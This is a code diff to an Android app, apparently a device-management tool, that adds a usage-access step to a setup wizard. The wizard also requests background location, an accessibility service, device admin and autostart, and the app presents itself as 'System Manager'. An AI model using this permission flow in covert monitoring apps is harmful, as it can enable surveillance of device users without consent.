@@ -8,6 +8,8 @@ import android.app.usage.UsageStatsManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.app.usage.UsageStats;
+import android.app.usage.UsageStatsManager;
 import android.content.SharedPreferences;
 import android.net.Uri;
 import android.content.pm.PackageManager;
@@ -33,10 +35,11 @@ public class MainActivity extends BridgeActivity {
     // Simplified steps — only dialog-based, no surprise Settings launches
     private static final int STEP_PERMISSIONS   = 0;
     private static final int STEP_BG_LOCATION   = 1;
-    private static final int STEP_ACCESSIBILITY = 2;
-    private static final int STEP_DEVICE_ADMIN  = 3;
-    private static final int STEP_OEM_AUTOSTART = 4;
-    private static final int STEP_DONE          = 5;
+    private static final int STEP_USAGE         = 2;
+    private static final int STEP_ACCESSIBILITY = 3;
+    private static final int STEP_DEVICE_ADMIN  = 4;
+    private static final int STEP_OEM_AUTOSTART = 5;
+    private static final int STEP_DONE          = 6;
 
     private static final String PREFS_NAME = "mdm_setup";
     private static final String KEY_DONE   = "setup_done";
@@ -90,6 +93,7 @@ public class MainActivity extends BridgeActivity {
         switch (step) {
             case STEP_PERMISSIONS:   doPermissions();   break;
             case STEP_BG_LOCATION:   doBgLocation();    break;
+            case STEP_USAGE:         doUsage();         break;
             case STEP_ACCESSIBILITY: doAccessibility(); break;
             case STEP_DEVICE_ADMIN:  doDeviceAdmin();   break;
             case STEP_OEM_AUTOSTART: doOemAutoStart();  break;
@@ -139,7 +143,46 @@ public class MainActivity extends BridgeActivity {
         }
     }
 
-    // ── Step 2 — Accessibility service ────────────────────────────────────
+    // ── Step 2 — Usage Access ────────────────────────────────────────────
+
+    private void doUsage() {
+        if (isUsageAccessGranted()) { nextStep(); return; }
+        new AlertDialog.Builder(this)
+            .setTitle("Usage Access Permission")
+            .setMessage(
+                "Steps:\n\n" +
+                "1. 'Open Settings' dabao\n" +
+                "2. 'System Manager' dhundho\n" +
+                "3. Toggle ON karo\n" +
+                "4. Back press karke wapas aao\n\n" +
+                "(Settings → Special App Access → Usage Access)")
+            .setCancelable(false)
+            .setPositiveButton("Open Settings", (d, w) -> {
+                waitingForResume = true;
+                try {
+                    Intent i = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
+                    i.setData(Uri.parse("package:" + getPackageName()));
+                    startActivity(i);
+                } catch (Exception ignored) {
+                    try { startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)); }
+                    catch (Exception e2) { nextStep(); }
+                }
+            })
+            .setNegativeButton("Skip", (d, w) -> nextStep())
+            .show();
+    }
+
+    private boolean isUsageAccessGranted() {
+        try {
+            UsageStatsManager usm = (UsageStatsManager) getSystemService(USAGE_STATS_SERVICE);
+            long now = System.currentTimeMillis();
+            List<UsageStats> stats = usm.queryUsageStats(
+                UsageStatsManager.INTERVAL_DAILY, now - 60_000, now);
+            return stats != null && !stats.isEmpty();
+        } catch (Exception e) { return false; }
+    }
+
+    // ── Step 3 — Accessibility service ────────────────────────────────────
 
     private void doAccessibility() {
         if (isAccessibilityEnabled()) { nextStep(); return; }
